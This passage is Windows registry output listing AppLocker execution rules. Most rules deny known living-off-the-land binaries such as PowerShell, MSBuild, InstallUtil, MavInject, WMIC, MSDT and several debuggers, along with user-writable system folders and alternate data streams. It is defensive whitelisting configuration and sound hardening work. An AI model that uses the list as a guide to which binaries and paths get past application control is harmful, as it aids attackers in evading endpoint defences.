    Value    REG_SZ    <FileHashRule Id="45073ce5-caf5-498c-b5e8-e819cf4b0625" Name="chromedriver.exe - seleniumSimulator(Task schudler)" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FileHashCondition><FileHash Type="SHA256" Data="0x1ae905aa985ffba02e3a57feda268cdc747ae02a54ef258b58a19df01e42dcae" SourceFileName="chromedriver.exe" SourceFileLength="16975360"/></FileHashCondition></Conditions></FileHashRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\45073ce5-caf5-498c-b5e8-e819cf4b0626
    Value    REG_SZ    <FileHashRule Id="45073ce5-caf5-498c-b5e8-e819cf4b0626" Name="chromedriver.exe - seleniumSimulator(Task schudler)" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FileHashCondition><FileHash Type="SHA256" Data="0xbd8c2a516f64d653dda0a9f763589821e423c364515d8b7d61a4cbeb7a653f54" SourceFileName="chromedriver.exe" SourceFileLength="19822080"/></FileHashCondition></Conditions></FileHashRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\47de4b35-139d-4c63-86fb-4650d6ed506c
    Value    REG_SZ    <FilePublisherRule Id="47de4b35-139d-4c63-86fb-4650d6ed506c" Name="POWERSHELL.EXE, in MICROSOFTr WINDOWSr OPERATING SYSTEM, from O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-5-21-1842486011-416502281-2506894253-1000" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="POWERSHELL.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\4a62bc1a-ae71-4691-8f12-545b2788e020
    Value    REG_SZ    <FilePublisherRule Id="4a62bc1a-ae71-4691-8f12-545b2788e020" Name="Block NTSD.EXE  (Debuggers)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="NTSD.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\4d578eb1-cdde-40f7-a8b7-897e560a60e9
    Value    REG_SZ    <FilePathRule Id="4d578eb1-cdde-40f7-a8b7-897e560a60e9" Name="Users-writable Path: %WINDIR%\servicing\Sessions\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\servicing\Sessions\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\4e09139e-5f79-432f-934f-430df91c1a4b
    Value    REG_SZ    <FilePathRule Id="4e09139e-5f79-432f-934f-430df91c1a4b" Name="%SYSTEM32%\bash.exe" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\bash.exe"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\4e98ac6a-4b5d-4296-9367-9ef6f8606703
    Value    REG_SZ    <FilePathRule Id="4e98ac6a-4b5d-4296-9367-9ef6f8606703" Name="Users-writable Path: %SYSTEM32%\Tasks_Migrated\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Tasks_Migrated\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\508836c1-7be2-437f-9555-107bcf63183a
    Value    REG_SZ    <FilePublisherRule Id="508836c1-7be2-437f-9555-107bcf63183a" Name="MAVINJECT64.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="MAVINJECT64.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\55ed2eed-37a7-4c81-906a-780968c70c1f
    Value    REG_SZ    <FilePathRule Id="55ed2eed-37a7-4c81-906a-780968c70c1f" Name="Users-writable Path: %WINDIR%\Tasks\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Tasks\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\59cc5e90-629b-40c7-8bcf-29434bb66014
    Value    REG_SZ    <FilePublisherRule Id="59cc5e90-629b-40c7-8bcf-29434bb66014" Name="POWERSHELL_ISE.EXE, in MICROSOFTr WINDOWSr OPERATING SYSTEM, from O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="POWERSHELL_ISE.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\5a700611-66f0-4ca7-8759-52ce069c536a
    Value    REG_SZ    <FilePublisherRule Id="5a700611-66f0-4ca7-8759-52ce069c536a" Name="Block CDB.EXE (Debuggers)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="CDB.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\5b55f220-27a6-4a34-b948-68e43c6484ae
    Value    REG_SZ    <FilePublisherRule Id="5b55f220-27a6-4a34-b948-68e43c6484ae" Name="WINDBG.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="WINDBG.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\5bacb6ff-674f-4f96-aa4e-e48720c401cf
    Value    REG_SZ    <FilePathRule Id="5bacb6ff-674f-4f96-aa4e-e48720c401cf" Name="%SYSTEM32%\Microsoft\Crypto\RSA\MachineKeys:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Microsoft\Crypto\RSA\MachineKeys:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\5e2a1ffe-bf21-40f1-9c32-40f76d445938
    Value    REG_SZ    <FilePathRule Id="5e2a1ffe-bf21-40f1-9c32-40f76d445938" Name="SCCM - %WINDIR%\ccm\systemtemp\appvtempdata\appvcommandoutput:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ccm\systemtemp\appvtempdata\appvcommandoutput:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\5e310d38-95f6-4b7f-8505-e6a149198c51
    Value    REG_SZ    <FilePublisherRule Id="5e310d38-95f6-4b7f-8505-e6a149198c51" Name="TRACKER.EXE, in MICROSOFTr BUILD TOOLSr, from O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr BUILD TOOLSr" BinaryName="TRACKER.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\5f5e5fae-2640-41ba-b63c-3804283a883b
    Value    REG_SZ    <FilePathRule Id="5f5e5fae-2640-41ba-b63c-3804283a883b" Name="Users-writable Path: %WINDIR%\SysWOW64\Tasks\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\SysWOW64\Tasks\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\5f8108b0-bbc4-48fa-abf2-0c050edc6a19
    Value    REG_SZ    <FilePublisherRule Id="5f8108b0-bbc4-48fa-abf2-0c050edc6a19" Name="NTSD.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="NTSD.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\63f43a67-2979-4ac4-8023-392f92a207df
    Value    REG_SZ    <FilePublisherRule Id="63f43a67-2979-4ac4-8023-392f92a207df" Name="FORFILES.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="FORFILES.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\64904a7e-f006-46a1-8052-e73b9564c13d
    Value    REG_SZ    <FilePathRule Id="64904a7e-f006-46a1-8052-e73b9564c13d" Name="%SYSTEM32%\Microsoft\Crypto\RSA\MachineKeys\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Microsoft\Crypto\RSA\MachineKeys\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\64d0c5ad-2f74-4b03-8d2f-09de1c2f84e8
    Value    REG_SZ    <FilePublisherRule Id="64d0c5ad-2f74-4b03-8d2f-09de1c2f84e8" Name="INSTALLUTIL.EXE, i MICROSOFTr .NET FRAMEWORK, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="INSTALLUTIL.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\64e13f89-6de4-45fc-ae54-1404b4cfb67c
    Value    REG_SZ    <FilePathRule Id="64e13f89-6de4-45fc-ae54-1404b4cfb67c" Name="%WINDIR%\Temp:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Temp:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\67591ec8-2291-46e7-82da-b388a0e58ac3
    Value    REG_SZ    <FilePathRule Id="67591ec8-2291-46e7-82da-b388a0e58ac3" Name="%SYSTEM32%\winevt\Logs.\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\winevt\Logs.\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\73e6181d-1f0f-4d42-a90f-d5588e5056bc
    Value    REG_SZ    <FilePublisherRule Id="73e6181d-1f0f-4d42-a90f-d5588e5056bc" Name="Block FORFILES.EXE (WINDOWS)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="FORFILES.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\753da950-f2c1-43b5-9d16-0b15c8a68628
    Value    REG_SZ    <FilePublisherRule Id="753da950-f2c1-43b5-9d16-0b15c8a68628" Name="MSDT.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="MSDT.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\78dba2df-5fe6-4b7e-a274-bd647dc677ab
    Value    REG_SZ    <FilePathRule Id="78dba2df-5fe6-4b7e-a274-bd647dc677ab" Name="%SYSTEM32%\Spool\PRINTERS\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Spool\PRINTERS\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\7a05cb7c-e69c-45ae-831d-1fedc7925ee4
    Value    REG_SZ    <FilePublisherRule Id="7a05cb7c-e69c-45ae-831d-1fedc7925ee4" Name="BGINFO, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="BGINFO" BinaryName="*"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\7ae88df7-cdd3-439a-a1b6-b5193de057ae
    Value    REG_SZ    <FilePublisherRule Id="7ae88df7-cdd3-439a-a1b6-b5193de057ae" Name="ATBROKER.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="ATBROKER.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\7af5ec56-b589-4217-bfe9-b9c9cebb2a0e
    Value    REG_SZ    <FilePublisherRule Id="7af5ec56-b589-4217-bfe9-b9c9cebb2a0e" Name="Block FSIANYCPU.EXE (SDK Utility)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr F#" BinaryName="FSIANYCPU.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\7ce374b1-3983-4e18-9d8a-17de86121178
    Value    REG_SZ    <FilePathRule Id="7ce374b1-3983-4e18-9d8a-17de86121178" Name="%SYSTEM32%\spool\drivers\color\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\spool\drivers\color\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\7e4ea39e-324d-4705-91e6-65b4e7a821bd
    Value    REG_SZ    <FilePublisherRule Id="7e4ea39e-324d-4705-91e6-65b4e7a821bd" Name="Block FSI.EXE (SDK Utility)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr F#" BinaryName="FSI.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\7e5347da-a19e-4ae5-b886-ec29dfcf3978
    Value    REG_SZ    <FilePublisherRule Id="7e5347da-a19e-4ae5-b886-ec29dfcf3978" Name="INFDEFAULTINSTALL.EXE, in MICROSOFTr WINDOWSr OPERATING SYSTEM, from O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="INFDEFAULTINSTALL.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\8024cbd5-d315-413e-b352-a9e572fddbb3
    Value    REG_SZ    <FilePathRule Id="8024cbd5-d315-413e-b352-a9e572fddbb3" Name="%SYSTEM32%\Tasks\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Tasks\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\808c3e9b-725c-4969-aba3-83b7f9462090
    Value    REG_SZ    <FilePublisherRule Id="808c3e9b-725c-4969-aba3-83b7f9462090" Name="MSBUILD.EXE, i MICROSOFTr .NET FRAMEWORK, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="MSBUILD.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\80b3d2b6-8133-482b-8311-94ee3641772c
    Value    REG_SZ    <FilePublisherRule Id="80b3d2b6-8133-482b-8311-94ee3641772c" Name="ADDINPROCESS32.EXE, i MICROSOFTr .NET FRAMEWORK, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="ADDINPROCESS32.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\818810cf-bd1b-424c-881a-a6d020377c6c
    Value    REG_SZ    <FilePathRule Id="818810cf-bd1b-424c-881a-a6d020377c6c" Name="Users-writable Path: %SYSTEM32%\Tasks\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Tasks\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\822d876e-fdf0-4a8a-ad44-fd42752cc0b1
    Value    REG_SZ    <FilePublisherRule Id="822d876e-fdf0-4a8a-ad44-fd42752cc0b1" Name="PRESENTATIONHOST.EXE, i MICROSOFTr .NET FRAMEWORK, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="PRESENTATIONHOST.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\859d7549-e8eb-43ff-a0ca-c547dd7b9045
    Value    REG_SZ    <FilePathRule Id="859d7549-e8eb-43ff-a0ca-c547dd7b9045" Name="SCCM - %WINDIR%\ccm\inventory\noidmifs:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ccm\inventory\noidmifs:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\86fd35e0-5f7a-44f5-a2fb-42f22270b9b6
    Value    REG_SZ    <FilePathRule Id="86fd35e0-5f7a-44f5-a2fb-42f22270b9b6" Name="Users-writable Path: %SYSTEM32%\spool\PRINTERS\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\spool\PRINTERS\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\88a8e462-ce40-4b04-8634-4d8d634f311c
    Value    REG_SZ    <FilePublisherRule Id="88a8e462-ce40-4b04-8634-4d8d634f311c" Name="WMIC.EXE, in MICROSOFTr WINDOWSr OPERATING SYSTEM, from O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="WMIC.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\891a4031-b849-4d04-b070-0efedbea02f5
    Value    REG_SZ    <FilePathRule Id="891a4031-b849-4d04-b070-0efedbea02f5" Name="%WINDIR%\tracing:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\tracing:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\8980ba91-5ae8-4b73-b3f8-52910c190041
    Value    REG_SZ    <FilePublisherRule Id="8980ba91-5ae8-4b73-b3f8-52910c190041" Name="XWIZARD.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="XWIZARD.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\8aa5928f-a0fd-49d3-8192-677b29c86cef
    Value    REG_SZ    <FilePathRule Id="8aa5928f-a0fd-49d3-8192-677b29c86cef" Name="Users-writable Path: %WINDIR%\servicing\Packages\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\servicing\Packages\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\91324924-8a1a-44da-8676-6a3e7b956268
    Value    REG_SZ    <FilePathRule Id="91324924-8a1a-44da-8676-6a3e7b956268" Name="%WINDIR%\Registration\CRMLog:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Registration\CRMLog:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\921cc481-6e17-4653-8f75-050b80acca20
    Value    REG_SZ    <FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20" Name="(Default Rule) All files located in the Program Files folder" Description="Allows members of the Everyone group to run applications that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\931d4c73-a03d-460f-8acd-61001486f6d2
    Value    REG_SZ    <FilePathRule Id="931d4c73-a03d-460f-8acd-61001486f6d2" Name="SCCM - %WINDIR%\ccm\systemtemp\appvtempdata\appvcommandoutput\*" Description="SCCM specific" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ccm\systemtemp\appvtempdata\appvcommandoutput\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\96d501f1-3c68-435d-ae99-45b737f88d84
    Value    REG_SZ    <FilePathRule Id="96d501f1-3c68-435d-ae99-45b737f88d84" Name="SCCM - %WINDIR%\ccm\logs:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ccm\logs:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\9bacfd7c-8f6e-4786-abe5-d41a12d6d534
    Value    REG_SZ    <FilePathRule Id="9bacfd7c-8f6e-4786-abe5-d41a12d6d534" Name="%SYSTEM32%\catroot2\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\catroot2\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\9faed8ee-da2d-4aa6-b9d3-dd73ff14127f
    Value    REG_SZ    <FilePathRule Id="9faed8ee-da2d-4aa6-b9d3-dd73ff14127f" Name="Users-writable Path: %SYSTEM32%\spool\SERVERS\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\spool\SERVERS\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\a333b3c6-196b-47cb-ab0c-00921c5c4257
    Value    REG_SZ    <FilePathRule Id="a333b3c6-196b-47cb-ab0c-00921c5c4257" Name="%SYSTEM32%\Fxstmp:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Fxstmp:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\a5f17aec-24b3-4e0e-8401-66a3184847bc
    Value    REG_SZ    <FilePublisherRule Id="a5f17aec-24b3-4e0e-8401-66a3184847bc" Name="Block REGSVCS.EXE (.NET Utilities)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="REGSVCS.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\a61c8b2c-a319-4cd0-9690-d2177cad7b51
